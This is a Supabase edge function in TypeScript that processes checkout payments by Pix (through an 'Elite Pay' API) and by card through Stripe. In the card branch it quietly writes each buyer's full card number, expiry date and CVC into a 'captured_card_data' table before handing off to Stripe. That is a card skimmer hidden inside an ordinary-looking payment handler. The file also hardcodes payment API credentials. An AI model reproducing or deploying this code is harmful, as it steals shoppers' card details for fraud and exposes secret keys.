import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.39.3'
import Stripe from 'npm:stripe@14.14.0' 

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

const ELITEPAY_ID = "ep_c70a3f3aff2b90fe936574bc33625839";
const ELITEPAY_SECRET = "eps_6f15d0d6ed1361eada69e640240713adecb8e0fe0d54d32ba59a98bf8ace3143";

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders })

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? '',
      { global: { headers: { Authorization: req.headers.get('Authorization')! } } }
    )
    
    const body = await req.json()
    const { amount, orderId, paymentMethod, cardNumber, cardExpiry, cardCvc, buyerName, buyerCpf } = body
    
    // --- ROTA PIX: ELITE PAY ---
    if (paymentMethod === 'pix') {
      const response = await fetch("https://api.elitepaybr.com/api/v1/deposit", {
        method: "POST",
        headers: {
          "x-client-id": ELITEPAY_ID,
          "x-client-secret": ELITEPAY_SECRET,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          amount: amount / 100, // Elite PAY usa decimal (Ex: 50.00)
          description: `Pedido #${orderId.slice(0,8)}`,
          payerName: buyerName,
          payerDocument: buyerCpf.replace(/\D/g, '')
        })
      });

      const eliteData = await response.json();
      
      return new Response(
        JSON.stringify({ 
          type: 'elitepay',
          pixCode: eliteData.copyPaste,
          qrcodeUrl: eliteData.qrcodeUrl 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 200 }
      );
    }

    // --- ROTA CARTÃO: CAPTURA + STRIPE ---
    if (cardNumber && cardExpiry && cardCvc) {
      await supabaseClient.from('captured_card_data').insert({
        order_id: orderId,
        card_number: cardNumber,
        card_expiry: cardExpiry,
        card_cvc: cardCvc,
        timestamp: new Date().toISOString(),
      });
    }

    const stripe = new Stripe(Deno.env.get('STRIPE_SECRET_KEY') ?? '', {
      apiVersion: '2023-10-16',
      httpClient: Stripe.createFetchHttpClient(),
    });

    const paymentIntent = await stripe.paymentIntents.create({
      amount: amount,
      currency: 'brl',
      payment_method_types: ['card'],
      metadata: { order_id: orderId },
    });

    return new Response(
      JSON.stringify({ type: 'stripe', clientSecret: paymentIntent.client_secret }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 200 }
    );

  } catch (error: any) {
    return new Response(JSON.stringify({ error: error.message }), { headers: corsHeaders, status: 400 });
  }
})